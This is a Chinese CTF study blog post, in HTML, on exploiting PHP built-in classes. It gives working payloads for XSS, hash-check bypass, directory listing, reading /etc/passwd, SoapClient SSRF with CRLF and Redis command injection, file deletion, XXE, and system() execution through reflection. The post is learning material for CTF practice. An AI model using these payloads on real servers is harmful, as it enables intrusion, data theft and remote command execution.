@@ -1,0 +1,673 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+  
+
+    <head>
+      <meta charset="utf-8" />
+        
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>PHP原生类 |  b1xcy&#39;s blog</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="/favicon.ico" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      
+<link rel="stylesheet" href="/css/fonts/remixicon.css">
+
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
+       
+ 
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    </head>
+  </html>
+</html>
+
+
+<body>
+  <div id="app">
+    
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-PHP原生类"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  PHP原生类
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2023/04/16/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/" class="article-date">
+  <time datetime="2023-04-16T05:32:18.288Z" itemprop="datePublished">2023-04-16</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">2.4k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">10 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>对于原生类的接触主要是在ctfshow菜鸟杯上的一道题，师傅用原生类两步就秒了，我还在来回折腾。所以记录一下在网上看到的可利用的原生类。</p>
+<p>原生类，顾名思义就是自带的类，不需要事前进行class定义。</p>
+<p>在ISCC2022web题有个就是典型的原生类利用</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304172321849.png" alt="image-20230417232054784"></p>
+<p>其中new的类和向类中传递的参数都可以自定义，就随便用原生类</p>
+<h1 id="原生类"><a href="#原生类" class="headerlink" title="原生类"></a>原生类</h1><h2 id="Error-x2F-Exception"><a href="#Error-x2F-Exception" class="headerlink" title="Error&#x2F;Exception"></a>Error&#x2F;Exception</h2><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>这两个类中都内置了__toString()方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = new Error(&quot;test&quot;);</span><br><span class="line">echo $a;</span><br></pre></td></tr></table></figure>
+
+<p>当执行时，会输出该“test”</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304172331089.png" alt="image-20230417233124069"></p>
+<p>而这个test是直接拼接到网页中的，那就有xss攻击：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a = new Error(&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;);</span><br><span class="line">echo $a;</span><br></pre></td></tr></table></figure>
+
+<p>此时，会把<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>直接拼接到html中，造成xss攻击</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304172333969.png" alt="image-20230417233325942"></p>
+<p>确实是当成脚本解析了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304172334701.png" alt="image-20230417233451683"></p>
+<h3 id="绕过哈希比较"><a href="#绕过哈希比较" class="headerlink" title="绕过哈希比较"></a>绕过哈希比较</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = new Error(&quot;payload&quot;,1);</span><br><span class="line">echo $a;</span><br></pre></td></tr></table></figure>
+
+<p>在使用类中的__toString()方法时，向Error中传入的1并不会显示，这说明在字符串操作时候，只要传入的“payload”相同，即视为该<strong>字符串</strong>相同。</p>
+<p>但不同的两个类本质上是不一样的。这样说可能有点绕，来看代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = new Error(&quot;payload&quot;,1);$b = new Error(&quot;payload&quot;,2);</span><br><span class="line">echo $a . $b;</span><br></pre></td></tr></table></figure>
+
+<p>注意，把$a和$b放在同一行定义才能保证echo出来的内容一致。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error: payload in /home/kali/index.php:2 Stack trace: #0 &#123;main&#125;Error: payload in /home/kali/index.php:2 Stack trace: #0 &#123;main&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可见，两者的字符串是完全一致的，但是进行var_dump比对时，两者的值却不相同。</p>
+<p>这就让我想起来之前学长布置过的一个rce：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if((string)$_POST[&#x27;a&#x27;] != (string)$_POST[&#x27;b&#x27;] &amp;&amp; sha1($_POST[&#x27;a&#x27;]) === sha1($_POST[&#x27;b&#x27;]))</span><br></pre></td></tr></table></figure>
+
+<p>很不巧，这里是用post方法接收值，而且进行了string转换，而转换之后的值就一样了，所以没法用这个方法解，学长给出来的wp是用读取恶意构造的pdf文件以绕过。</p>
+<p>但是如果换个题，把应用场景换在类中比较：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if($this-&gt;a != $this-&gt;b &amp;&amp; sha1($this-&gt;a) === sha1($this-&gt;b))</span><br></pre></td></tr></table></figure>
+
+<p>此时就可以用原生类绕过了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;a = new Error(&quot;payload&quot;,1);$this-&gt;b = new Error(&quot;payload&quot;,2);</span><br></pre></td></tr></table></figure>
+
+<h2 id="Directorylterator-x2F-Filesystemlterator"><a href="#Directorylterator-x2F-Filesystemlterator" class="headerlink" title="Directorylterator&#x2F;Filesystemlterator"></a>Directorylterator&#x2F;Filesystemlterator</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dir = $_GET[&#x27;whoami&#x27;];</span><br><span class="line">$a = new DirectoryIterator($dir);</span><br><span class="line">foreach($a as $f)&#123;</span><br><span class="line">    echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>传入<code>/?whoami=glob:///*</code>即可查看根目录下的所有文件</p>
+<p>如果不用foreach就只能查看第一个</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304181239835.png" alt="image-20230418123910771"></p>
+<p>Filesystemlterator和DirectoryIterator的不同是：Filesystemlterator返回的是以绝对路径显示，而DirectoryIterator仅显示当前目录下</p>
+<h2 id="Globlterator"><a href="#Globlterator" class="headerlink" title="Globlterator"></a>Globlterator</h2><p>这个类与前两个类似，不过这个查找文件时不需要搭配<code>glob://</code>伪协议使用，直接传入路径即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dir = &quot;/*&quot;;</span><br><span class="line">$a = new GlobIterator($dir);</span><br><span class="line">foreach($a as $f)&#123;</span><br><span class="line">    echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304181240938.png" alt="image-20230418124020916"></p>
+<h2 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject"></a>SplFileObject</h2><p>可以利用该类读取文件的一行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$context = new SplFileObject(&#x27;/etc/passwd&#x27;);</span><br><span class="line">echo $context;</span><br></pre></td></tr></table></figure>
+
+<p>但是也只能读一行，如果要全部读取要加foreach遍历</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$context = new SplFileObject(&#x27;/etc/passwd&#x27;);</span><br><span class="line">foreach($context as $f)&#123;</span><br><span class="line">    echo($f);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h2><p>SoapClient类中内置了一个__call方法，触发该方法之后可以发送http和https请求。这个也可以被运用在ssrf中。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public SoapClient :: SoapClient(mixed $wsdl [，array $options ])</span><br></pre></td></tr></table></figure>
+
+<p>第一个参数是用来指明是否是wsdl模式，将该值设为null则表示非wsdl模式。</p>
+<p>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。</p>
+<p>则可以构造：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = new SoapClient(null,array(&#x27;location&#x27;=&gt;&#x27;http://192.168.255.129:1234/aaa&#x27;, &#x27;uri&#x27;=&gt;&#x27;http://192.168.255.129:1234&#x27;));</span><br><span class="line">$a-&gt;a();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在192.168.255.129上给一个1234的监听，可以接收到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /aaa HTTP/1.1</span><br><span class="line">Host: 192.168.255.129:1234</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">User-Agent: PHP-SOAP/8.2.0</span><br><span class="line">Content-Type: text/xml; charset=utf-8</span><br><span class="line">SOAPAction: &quot;http://192.168.255.129:1234#a&quot;</span><br><span class="line">Content-Length: 388</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:ns1=&quot;http://192.168.255.129:1234&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:SOAP-ENC=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:a/&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt;</span><br></pre></td></tr></table></figure>
+
+<p>如果HTTP头存在CRLF漏洞，就可以通过SSRF+CRLF插入任意HTTP头。</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$target = &#x27;http://192.168.255.129:1234&#x27;;</span><br><span class="line">$a = new SoapClient(null,array(&#x27;location&#x27; =&gt; $target, &#x27;user_agent&#x27; =&gt; &quot;WHOAMI\r\nCookie: PHPSESSID=test&quot;, &#x27;uri&#x27; =&gt; &#x27;test&#x27;));</span><br><span class="line">$a-&gt;a();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>成功插入cookie：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 192.168.255.129:1234</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">User-Agent: WHOAMI</span><br><span class="line">Cookie: PHPSESSID=test</span><br><span class="line">Content-Type: text/xml; charset=utf-8</span><br><span class="line">SOAPAction: &quot;test#a&quot;</span><br><span class="line">Content-Length: 365</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:ns1=&quot;test&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:SOAP-ENC=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:a/&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>同理，还可以插入Redis命令:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$target = &#x27;http://192.168.255.129:1234&#x27;;</span><br><span class="line">$a = new SoapClient(null,array(&#x27;location&#x27; =&gt; $target, &#x27;user_agent&#x27; =&gt; &quot;WHOAMI\r\nCONFIG SET dir /var/www/html&quot;, &#x27;uri&#x27; =&gt; &#x27;test&#x27;));</span><br><span class="line">$a-&gt;a();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>也可以发送POST数据包，但是要设置<code>Content-Type</code>为<code>application/x-www-form-urlencoded</code>。</p>
+<p>由于<code>Content-Type</code>的位置在UA底下，就可以通过类中的UA插入<code>Content-Type</code>，把原来的挤到地下作为POST内容</p>
+<p>抄的一份payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$target = &#x27;http://192.168.255.129:1234&#x27;;</span><br><span class="line">$poc = &quot;CONFIG SET dir /var/www/html&quot;;</span><br><span class="line">$post_data = &#x27;data=whoami&#x27;;</span><br><span class="line">$headers = array(</span><br><span class="line">    &#x27;X-Forwarded-For: 127.0.0.1&#x27;,</span><br><span class="line">    &#x27;Cookie: PHPSESSID=Cookie&#x27;</span><br><span class="line">);</span><br><span class="line">$a = new SoapClient(null,array(&#x27;location&#x27; =&gt; $target,&#x27;user_agent&#x27;=&gt;&quot;UA\n\rContent-Type: application/x-www-form-urlencoded\n\r&quot;.join(&quot;\n\r&quot;,$headers).&quot;\n\rContent-Length: &quot;. (string)strlen($post_data).&quot;\n\r\n\r&quot;.$post_data,&#x27;uri&#x27;=&gt;&#x27;test&#x27;));</span><br><span class="line">$a-&gt;a();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>返回的结果：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304181456858.png" alt="image-20230418145614812"></p>
+<p>成功传入了POST内容。</p>
+<h2 id="ZipArchive"><a href="#ZipArchive" class="headerlink" title="ZipArchive"></a>ZipArchive</h2><p>类下有个open方法，可以打开一个新的或现有的zip文档进行读取.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZipArchive::open ( string $filename [, int $flags ] ) : mixed</span><br></pre></td></tr></table></figure>
+
+<p>flags可以指定开打的模式：</p>
+<ul>
+<li><p><code>ZipArchive::OVERWRITE</code>：总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖或删除。</p>
+</li>
+<li><p><code>ZipArchive::CREATE</code>：如果不存在则创建一个zip压缩包。</p>
+</li>
+<li><p><code>ZipArchive::RDONLY</code>：只读模式打开压缩包。</p>
+</li>
+<li><p><code>ZipArchive::EXCL</code>：如果压缩包已经存在，则出错。</p>
+</li>
+<li><p><code>ZipArchive::CHECKCONS</code>：对压缩包执行额外的一致性检查，如果失败则显示错误。</p>
+</li>
+</ul>
+<p>如果指定flags为<code>ZipArchive::OVERWRITE</code>，就可以把指定文件删除。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a = new ZipArchive();</span><br><span class="line">$a-&gt;open(&#x27;1.txt&#x27;,ZipArchive::OVERWRITE); </span><br></pre></td></tr></table></figure>
+
+<p>由于没有保存，所以最后的效果就是把1.txt删除</p>
+<h2 id="SimpleXMLElement"><a href="#SimpleXMLElement" class="headerlink" title="SimpleXMLElement"></a>SimpleXMLElement</h2><p>这个类用于解析XML文档中的元素。</p>
+<p>官方文档中对于SimpleXMLElement 类的构造方法 <code>SimpleXMLElement::__construct</code> 的定义如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public SimpleXMLElement::__construct(</span><br><span class="line">    string $data,</span><br><span class="line">    int $options = 0,</span><br><span class="line">    bool $dataIsURL = false,</span><br><span class="line">    string $namespaceOrPrefix = &quot;&quot;,</span><br><span class="line">    bool $isPrefix = false</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p><code>$data</code>：格式正确的XML字符串，或者XML文档的路径或URL（如果<code>$data_is_url</code>为true）。</p>
+<p><code>$data_is_url</code>：默认情况下<code>$data_is_url</code>为false。使用true指定<code>$data</code>的路径或URL到一个XML文件，而不是字符串数据。</p>
+<p>可以看到通过设置第三个参数 <code>$data_is_url</code> 为 <code>true</code>，我们可以实现远程xml文件的载入。第一个参数 data 就是我们自己设置的payload的url地址，即用于引入的外部实体的url。</p>
+<p>当可以控制目标的调用的类的时候，就可以通过这个类进行XXE攻击。</p>
+<p>攻击的手法：</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3357">一篇文章带你深入理解漏洞之 XXE 漏洞 - 先知社区 (aliyun.com)</a></p>
+<h2 id="Reflection"><a href="#Reflection" class="headerlink" title="Reflection"></a>Reflection</h2><h3 id="ReflectionMethod"><a href="#ReflectionMethod" class="headerlink" title="ReflectionMethod"></a>ReflectionMethod</h3><p>该类中有个<code>getDocComment()</code> 方法，可以获得类中函数的注释内容。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$a = new ReflectionMethod(&#x27;F&#x27;,&#x27;get&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>输出</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304182029027.png" alt="image-20230418202913993"></p>
+<h3 id="ReflectionClass"><a href="#ReflectionClass" class="headerlink" title="ReflectionClass"></a>ReflectionClass</h3><p>能显示出类中的属性和方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class F&#123;</span><br><span class="line">    protected $pro;</span><br><span class="line">    private $pri;</span><br><span class="line">    protected function get()&#123;</span><br><span class="line">        echo &#x27;pro&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$ref = new ReflectionClass(&#x27;F&#x27;);</span><br><span class="line">echo $ref;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304182032267.png" alt="image-20230418203240233"></p>
+<h3 id="ReflectionFunction"><a href="#ReflectionFunction" class="headerlink" title="ReflectionFunction"></a>ReflectionFunction</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = &quot;system&quot;;</span><br><span class="line">$b = &quot;whoami&quot;;</span><br><span class="line">$func = new ReflectionFunction($a);</span><br><span class="line">echo $func-&gt;invokeArgs(array($b));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304182152509.png" alt="image-20230418215234029"></p>
+<h1 id="动态调用"><a href="#动态调用" class="headerlink" title="动态调用"></a>动态调用</h1><p>学习中看到别人的博客经常提到“动态调用”，因此去了解了一下。</p>
+<p>PHP 支持可变函数的概念。这意味着如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它。可变函数可以用来实现包括回调函数，函数表在内的一些用途。</p>
+<p>当给一个函数名赋值给一个变量时，可以通过调用这个变量来调用这个函数。</p>
+<p>浅显一点的有：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = &quot;system&quot;;</span><br><span class="line">$b = &quot;whoami&quot;;</span><br><span class="line">($a)($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这样相当于直接执行了<code>system(whoami)</code>命令。</p>
+<p>复杂调用有：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class F&#123;</span><br><span class="line">	public function sys($exec)&#123;</span><br><span class="line">		system($exec);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$n = new F();</span><br><span class="line">$a = array($n,&quot;sys&quot;);</span><br><span class="line">$b = &quot;whoami&quot;;</span><br><span class="line">$a($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>其中通过数组来调用F类中的sys函数，并把<code>whoami</code>赋值给$b，传到了F类中的sys函数。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304182208435.png" alt="image-20230418220831410"></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://johnfrod.top/%E5%AE%89%E5%85%A8/ctf-%E4%B8%AD-php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/">CTF 中 PHP原生类的利用 – JohnFrod’s Blog</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3357">一篇文章带你深入理解漏洞之 XXE 漏洞 - 先知社区 (aliyun.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/functions.variable-functions.php">PHP: 可变函数 - Manual</a></p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2023/04/16/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%9F%BA%E7%A1%80/" rel="tag">基础</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2023/04/25/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            PHP伪协议
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2023/04/12/ctfhub%E7%BB%83%E4%B9%A0/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">ctfhub练习</div>
+      </a>
+    
+  </nav>
+
+  
+   
+  
+   
+    <script src="https://cdn.staticfile.org/twikoo/1.4.18/twikoo.all.min.js"></script>
+    <div id="twikoo" class="twikoo"></div>
+    <script>
+        twikoo.init({
+            envId: ""
+        })
+    </script>
+ 
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2022-2023
+        <i class="ri-heart-fill heart_icon"></i> b1xcy
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
